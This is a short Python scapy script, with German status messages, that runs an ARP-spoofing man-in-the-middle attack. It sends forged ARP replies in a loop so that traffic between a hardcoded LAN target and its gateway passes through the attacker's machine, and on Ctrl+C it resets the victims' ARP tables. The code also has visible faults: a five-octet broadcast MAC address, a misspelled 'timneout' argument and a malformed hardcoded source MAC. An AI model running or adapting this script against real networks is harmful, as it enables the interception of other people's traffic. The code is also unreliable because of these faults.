#!/usr/bin/env python
import scapy.all as scapy
import time
#import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timneout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    #target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="20:c9:d0:83:a7:6f", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    #destination_mac = get_mac(destination_ip)
    #source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst="20:c9:d0:83:a7:6f", psrc=source_ip, hwsrc="78:81:2:37:65:48")
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.2.100"
gateway_ip = "192.168.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Pakete gesendet: " + str(sent_packets_count), end="")
        #sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] CTRL + C wurde ausgeführt ...... ARP tables wurde zurückgesetzt.\n")

